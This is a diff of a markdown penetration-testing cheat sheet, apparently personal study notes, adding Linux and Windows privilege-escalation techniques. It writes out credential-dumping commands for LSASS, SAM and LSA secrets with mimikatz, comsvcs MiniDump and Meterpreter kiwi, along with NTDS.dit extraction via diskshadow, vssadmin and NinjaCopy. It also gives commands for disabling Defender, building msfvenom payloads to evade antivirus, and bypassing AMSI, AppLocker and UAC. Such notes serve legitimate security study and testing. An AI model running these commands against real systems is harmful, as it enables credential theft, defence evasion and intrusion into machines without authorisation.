+  grep -RHine "[STRING]" [PATH] [-e REGEX]
   ```
 
   - `-r` recursive
@@ -5207,9 +5803,9 @@ Directories & Files Worth Checking:
   Some examples:
 
   ```bash
-  grep -rniH "password = '" .		# string assignment (try also with \")
-  grep -rniH "password':" . 		# dictionary assignment
-  grep -rniH "password'," .		# tuple assignment
+  grep -RHine "password = '" .		# string assignment (try also with \")
+  grep -RHine "password':" . 		# dictionary assignment
+  grep -RHine "password'," .		# tuple assignment
   ```
 
 - Shadow Hashes `/etc/shadow` 
@@ -5217,7 +5813,7 @@ Directories & Files Worth Checking:
 ### Network Services
 
 ```bash
-netstat -tulnap | grep "LISTEN\|ENSTABILISHED"
+netstat -tulnap | grep "LISTEN\|ESTABILISHED"
 ```
 
 - `LISTEN`&rarr; Pivot
@@ -5324,8 +5920,10 @@ Config Files:
 #### Running process
 
 ```bash
-ps -aux | grep [USER, ROOT...]
+ps -ef | grep [USER] | grep -v ]
 ```
+
+If no processes are visible, check `mount | grep ^proc`, and see if hidepid is equal to invisible or 2. If so, all processes are invisible, except for yours.
 
 ##### logrotate
 
@@ -5405,9 +6003,89 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 - **Add new scheduled task:** If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse  shell when executed by the root.
 - **PATH Hijacking**
 
+### Local Applications
+
+#### ELF Executable
+
+ELF files is the format of binaries with .so libraries, which are in the momory of the process. It can connect to services, and are interesting even if they don't have privileges (sudo, suid). They are usually found:
+
+- `/var/opt`
+- `/usr/share`
+- `/`
+- `/home/[USER]`
+
+-  Examine with [PEDA](https://github.com/longld/peda) Debugger
+
+  ```bash
+  gdb [BINARY]
+  # Return every function and their address, exclude everything that starts with _, frame_dummy, register, deregister.
+  gdb-peda$ info functions
+  # Run the program
+  gdb-peda$ run
+  # Disassemble the function, start with main
+  gdb-peda$ disas [FUNCTION]
+  ```
+
+- Check for calls to function, e.g. 
+
+  `call   0x5555555551b0 <SQLDriverConnect@plt>`
+
+  - **The name of the function** is what is inside `<>`, without `@plt`.  The presence of `@plt` indicates that the function is called by a library.
+
+  - **The arguments of the functions** are stored before the call:
+
+    - `%*di`: 1st arg
+
+    - `%*si`: 2st arg
+
+    - `%*dx`: 3rd arg
+
+    `%*cx`: 4th arg
+
+  - **The value of an argument,** is either an integer or a string.
+    - Integers are stored with a dollar followed by its the actual value (in exadecimal)
+    - Strings are visualized in white on the right-most column, and are preceded by an `#`. To get the value run: `x/s [VALUE WITHOUT #]`
+
+- Add a breakpoint after a function is called
+
+  ```bash
+  gdb-peda$ b [NAME OF THE FUNCTION]
+  # List breakpoints
+  gdb-peda$ i b
+  # Delete brakpoint
+  gdb-peda$ d [NUM OF BREAKPOINT]
+  ```
+
+- Run the program again and see if you can get credentials.
+
+  To have better redeability, since the CPU will be halted with a breakpoint, and you can check its status right before the call of the function with
+
+  ```bash
+  # Run until breakpoint
+  gdb-peda$ r
+  # check status of CPU
+  gdb-peda$ i r
+  # Continue after the breakpoint
+  gdb-peda$ c
+  # Jumo only to the next assembly instruction
+  gdb-peda$ nexti
+  ```
+
+  and check its arguments.
+
+- Change the value of an argument &rarr; exploit (e.g. SQL injection)
+
+  ```bash
+  gdb-peda$ set $[REGISTER]=0x[EX_VALUE] 
+  ```
+
 ### OS 
 
-- Kernel Exploits: `uname -a` 
+- Kernel Exploits: 
+
+  ```bash
+  cat /etc/*-release && uname -a
+  ```
 
 - Packages -> `dpkg -l` / `rpm -qa` -> DebSecan Tool / Privesc Tools
 
@@ -5422,6 +6100,8 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 ### Docker Breakout
 
 To check if you are in a docker container type `hostname`. A docker has a random string as hostname. Check [Docker Breakout](https://juggernaut-sec.com/docker-breakout-lpe/)
+
+**CHECK OS VERSION:**
 
 #### Enumeration
 
@@ -5503,12 +6183,40 @@ start cmd.exe				# Opens cmd
 cmd /c "<CMD Command>"		# Execute CMD command
 ```
 
+#### Desktop tricks
+
+##### Disallow file deletions
+
+Right click on the folder `Properties` -> `Security` -> `Advanced` -> `cybervaca` -> `Disable inheritance` -> `Convert inherited permissions into explicit permissions on this object` -> `Edit` -> `Show advanced permissions`, deselect the `Delete subfolders and files`, and `Delete`.
+
+#### x64dbg
+
+- To avoid going through any `dll` files, navigate to `Options` -> `Preferences`, uncheck everything except `Exit Breakpoint`
+
+-  right click inside the `CPU` view and `Follow in Memory Map`
+
+- Check `MAP` types files for credentials &rarr; double click, check if interesting &rarr;  right-click on the address and select `Dump Memory to File`
+
+- ```cmd
+  .\strings64.exe [FILE]
+  ```
+
+#### Tools
+
+- Winpeas
+- Lazagne: find credentials
+  - PowerUP: checks for DLL and service hijacking
+
 ### Users & Privileges
 
 - Users & Groups
-  - `net user`
+  - Every local user: `net user`
   - for every user: `net user [USER]`
-  - `tree /a /f c:\users`
+  - `tree /adh /f c:\users`
+  - The users that are currently logged in: `query user`
+  - Password policy: `net accounts`
+  - Env variables: `set`
+
 - Memberships & Privileges
 
   -  `whoami /all`
@@ -5520,9 +6228,37 @@ cmd /c "<CMD Command>"		# Execute CMD command
      - `SeRestore` &rarr; [xct_exploit](https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe)
      - `SeManage`
 
+- GUI access Abuse (e.g. xfreerdp)
+
+  - [CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
+  - [Support App](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#insecure-gui-apps) → [EoP Exploitation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#from-low-priv-user-to-nt-authority-system-cve-2019-1388-uac-bypass)
+
+- Shell Logging
+
+  - CMDKey
+    - `cmdkey /list`
+    - `runas /savecred /user:[USER] [CMD_HERE]`
+
+  - Console History
+    - `(Get-PSReadLineOption).HistorySavePath`
+    - `dir /adh /s /b ConsoleHost_history.txt`
+
+  - StickyNotes 
+    - `c:\Users\[USER]\AppData\Roaming\Microsoft\Sticky Notes`
+    - `cd C:\Users` → `dir /adh /s /b *.sqlite`
+
+  - Clipboard (copy-paste)
+    - `Get-Clipboard`
+    - `Invoke-ClipboardLogger`
+
+  - Transcripts & Logs
+    - `dir C:\Transcripts`
+    - `Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView`
+    - `Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview`
+
 #### SeImpersonate / SeAssignPrimaryToken
 
-You must be a **Service Account:** `SQL / IIS / NETWORK / LOCAL`
+You must be a **Service Account:** `NT *` or a member of a group with name `SQL / IIS / NETWORK / LOCAL`
 
 Get the [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise):
 
@@ -5536,26 +6272,65 @@ Potatoes:
 - Churrasco - Server 2003
 - [JuicyPotato](https://github.com/k4sth4/Juicy-Potato/tree/main) - Server 2008 - 2016 - Win 10 < 1803
 - GodPotato - Server 2012 - 2022
-- PrintSpoofer - Windows 10 / Server 2016 - 2019
+- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) - Windows 10 / Server 2016 - 2019
 - [GenericPotato](https://github.com/micahvandeusen/GenericPotato) - Windows 7 - 10 / Server < 2019
 - [Hot Potato](https://github.com/Kevin-Robertson/Tater) - Windows 7 - 10 / Server 2008 - 2012 - PS Based
 - [MultiPotato](https://github.com/S3cur3Th1sSh1t/MultiPotato) - When Others Fail → Useful for MSSQL
+- Meterpreter shell (auto exploit, when the exploit is old), not stealthy
+  - `load incognito` 
+  - `list_tokens -u` -> Lists allowed users to impersonate
+  - `impersonate_token [USER]` -> Double Backlashes for Username!
+
 
 #### SeDebug
 
 Allows to steal credentials from common processes or get a SYSTEM shell, by executing the [Mimikatz](https://github.com/ParrotSec/mimikatz/tree/master/x64) binary 
 
-- LSASS / DPAPI / VAULT Dumping
-  - `mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords"'`
-  - `mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'`
-  - `mimikatz.exe ‘"privilege::debug" "token::elevate" "sekurlsa::credman"’`
+- [Mimikatz](https://github.com/ParrotSec/mimikatz) / [Invoke-Mimikatz](https://github.com/PowershellMafia/Powersploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) → [All Commands / Techniques](https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cheatsheets/mimikatz-cheatsheet.md)
+  
+- Meterpreter Dumping
+  
+  - Dumps credentials using most of the Mimikatz modules
+  - `load kiwi`
+  - `creds_all`
+  - `hashdump`
+  
+- LSASS Dumping
+
+  ```cmd
+  mimikatz '"privilege::debug" "token::elevate" "sekurlsa::logonPasswords /patch"'
+  ```
+
+  - Manual, without mimikatz
+    1. Get PID → `Get-Process lsass`, `tasklist /svc`
+    2. `rundll32 C:\windows\system32\comsvcs.dll, MiniDump [PID] [OUT_DMP] full`
+    3. `pypykatz lsa minidump [DMP_FILE]`     → After DMP is Tranferred to Kali
+
+- RDP / DPAPI / VAULT Dumping
+
+  ```cmd
+  mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::dpapi"'
+  mimikatz.exe '"privilege::debug" "token::elevate" "sekurlsa::credman"'
+  mimikatz.exe '"privilege::debug" "token::elevate" "vault::cred /patch"'
+  ```
+
 - SAM / LSA Dumping (steals *local* hashes -> users appearing in `net user`)
-  - `mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'`
-  - `mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'`
-- SYSTEM Shell
-  - Get PID -> `tasklist /v /fi "username eq SYSTEM"`
-  - [PS Module](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1) -> `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
-  - [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit) / [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
+
+  ```cmd
+  mimikatz.exe '"privilege::debug" "token::elevate" "lsadump::sam"'
+  mimikatz.exe'"privilege::debug" "token::elevate" "lsadump::lsa /patch"'
+  mimikatz '"privilege::debug" "token::elevate" "lsadump::secrets /patch"'
+  ```
+
+- SYSTEM Shell (RCE)
+  - Meterpreter
+    - `pgrep [winlogon/lsass]` &rarr; Get PID
+    - `migrate [PID]`
+  - Manual
+    - `tasklist` &rarr;  Get `winlogon` or `lsass` PID
+    - [Method 1](https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1)  → `. .\psgetsys.ps1; ImpersonateFromParentPid -ppid [PID] -command [CMD] -cmdargs [ARGS]`
+    - [Method 2](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
+    - [Method 3](https://github.com/dev-zzo/exploits-nt-privesc/blob/master/SeDebugPrivilege/SeDebugPrivilege.c)
 
 #### SeBackup
 
@@ -5565,23 +6340,36 @@ Allows to steal credentials from common processes or get a SYSTEM shell, by exec
   2. `reg save hklm\system c:\windows\temp\system.sav`
   3. Download on Kali system.sav and sam.sav
   4. Extract hashes on Kali: `secretsdump.py -system system.sav -sam sam.sav LOCAL`
-
 - NTDS Dumping (Only on a DC Server)
 
-  - Backup the NTDS File
-
-    ```cmd
-    ntdsutil 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q
-    ```
-    
-  - Export to kali the following files
-  
+  - `secretsdump.py -ntds [NTDS_FILE] -system [SYSTEM_FILE] LOCAL`
+  - NTDSUtil
+    - `ntdsutil 'ac i ntds' 'ifm' 'create full c:\windows\temp\NTDS' q q`
     - `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
     - `C:\Windows\Temp\NTDS\registry\SYSTEM`
-  
-  - Extract hashes on Kali
-  
-    - `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
+  - DiskShadow
+    - `unix2dos [PAYLOAD.dsh]` → Transfer → `diskshadow /s [PAYLOAD.dsh]`
+    - Payload
+      - `set context persistent nowriters`
+      - `add volume c: alias cvol`
+      - `create`
+      - `expose %cvol% z:`
+    - Copy Data
+      - `robocopy /b z:\windows\ntds c:\windows\temp ntds.dit`
+      - `reg save hklm\system c:\windows\temp\system`
+  - NinjaCopy
+    - `Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\ntds.dit" -LocalDestination "C:\Windows\Temp\ntds"`
+    - `reg save hklm\system c:\windows\temp\system`
+  - VSSAdmin
+    - `vssadmin create shadow /for=C:`
+    - `copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\NTDS.dit.save`
+    - `copy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM.save`
+- Arbitrary File Read
+  - `Copy-FileSeBackupPrivilege '[PATH\TO\FILE]' .\[OUT]`
+  - PS Modules
+    - `Import-Module .\SeBackupPrivilegeUtils.dll`
+    - `Import-Module .\SeBackupPrivilegeCmdLets.dll`
+    - `Set-SeBackupPrivilege`
 
 ### Credential Hunting:
 
@@ -5630,18 +6418,47 @@ Allows to steal credentials from common processes or get a SYSTEM shell, by exec
 
 ### Local Network Services
 
-- `netstat -ano`
+- `netstat -ano | findstr LISTEN`
 - Network Information
   - `route PRINT`
   - `ipconfig /all`
-  - `arp -a`
 
 
 ### Local Processes
 
-- `tasklist` 
+- Enumerate running processes:
+
+  - Every running process
+
+  ```cmd
+  tasklist /v /fi "STATUS eq running"
+  ```
+
+  - Processes spawnd by a service:
+
+  ```cmd
+  tasklist /svc | findstr /v "N/A" | findstr /v "svchost"
+  ```
+
+- [Splunk     → Forwarder Abuse](https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2) / [Splunk Admin RevShell](https://github.com/0xjpuff/reverse_shell_splunk/)
+
+- [Erlang     → Port 25672](https://malicious.link/posts/2018/erlang-arce/)
+
 - Privileged Processes
+
 - Information in Process Strings
+
+#### Named Pipes
+
+File that can make two processes communicate.List all pipes with [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):
+
+```cmd
+accesschk.exe /accepteula -w \pipe\* -v
+```
+
+Look for `GENERIC_WRITE` / `FILE_ALL_ACCESS` or any kind of `WRITE`
+
+- [WindScribeService Exploit](https://www.exploit-db.com/exploits/48021)
 
 ### Local Applications
 
@@ -5657,6 +6474,29 @@ Relevant directories:
 - `C:/ProgramData`
 - `C:/Users/[USERNAME]/appdata`
 
+#### DLL
+
+Every executable `.exe`, will have to call a DLL, a dinamically Linked Library, which is on the disk. They contain the functions that are being called by the executable. 
+
+Given an executable, to understand which DLL it is linked to, monitor the process with`ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon).
+
+Use `ilspycmd` on Linux to read the source code, or [dnSpy](https://github.com/0xd4d/dnSpy) on Windows, if you also need to debug.
+
+#### Thick Clients 
+
+Applications that are installed locally on our computers, thus they do not require internet access to run.
+
+Monitor the process with`ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon), look for generated files
+
+- Run `strings64` on it
+- `ProcMon64` from [SysInternals](https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) and monitoring the process after running it on the terminal
+  - If some files are created, change the permissions of the folder to disallow file deletions &rarr; Look at the content
+  - Check .bat files, change them (e.g. if they delete somthing)
+- inspect `.exe` with `x64dbg` and look for memory dumps &rarr; run `strings`
+- Use `de4dot` for `.NET` file as deobfuscator and depacker &rarr; read the source code by dragging and dropping it onto the `DnSpy` executable
+
+Exploiting: https://0xdf.gitlab.io/2020/08/08/htb-fatty.html
+
 ### OS
 
 
@@ -5664,6 +6504,74 @@ Relevant directories:
 - Kernel Exploits
 - In meterpreter: local exploit suggester module
 - Vulnerable Software:  `C:\Program Files` 
+
+### Evasion
+
+#### Antivirus Evasion
+
+You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)
+
+- Enumeration
+  - General: `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
+  - **Defender only:** `Get-MpComputerStatus`
+- Folder Exclusion Bypass
+  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
+  - Place Malware in Allowed Folder
+- Disable AV (Code Execution as Admin)
+  - `powershell Set-MpPreference -DisableIOAVProtection $true`
+  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
+- Malware Obfuscation tools:
+  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
+  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
+  - Prometheus Shell
+    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
+    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
+
+#### Powershell evasion
+
+- Execution Policy
+  - `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
+  - `Set-ExecutionPolicy Bypass -Scope Process` -> From a PS Session
+  - 32/64-Bit Execution
+    - Try Both Binaries
+    - `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
+    - `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
+  
+- AMSI
+  - Paste the payload in a PS session to bypass AMSI
+  - [Payloads Here](https://amsi.fail)
+  
+- Constrained Language
+  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
+  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
+  
+- **AppLocker:** allows or denies execution on applications in certain folders
+
+  - ```powershell
+    Get-AppLockerPolicy -Effective | select -exp RuleCollections where {$_.action -eq Deny} | select-object
+    ```
+
+  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders
+
+
+#### UAC
+
+When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
+
+- Enumeration
+  - Member of "Administrators" + Restricted Privileges / File Access
+  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
+  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
+- Bypasess
+  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
+  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
+  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
+  - EventViewer Method
+    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
+    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
+  - PSExec (Local / Remote)
+    - `PsExec.exe -h -s -i cmd` -> No Credentials
+    - `psexec.py [AUTH_STRING]` -> Requires Credentials
 
 # OSINT
 
@@ -5779,4 +6687,5 @@ Relevant directories:
 
   -  [domain.glass](https://domain.glass) 
   -  [GrayHatWarfare](https://buckets.grayhatwarfare.com). We can do many different searches, discover AWS, Azure, and GCP cloud  storage, and even sort and filter by file format. Therefore, once we  have found them through Google, we can also search for them on  GrayHatWarefare and passively discover what files are stored on the  given cloud storage. SSH keys could be also leaked here.
-  -  
+  
+  
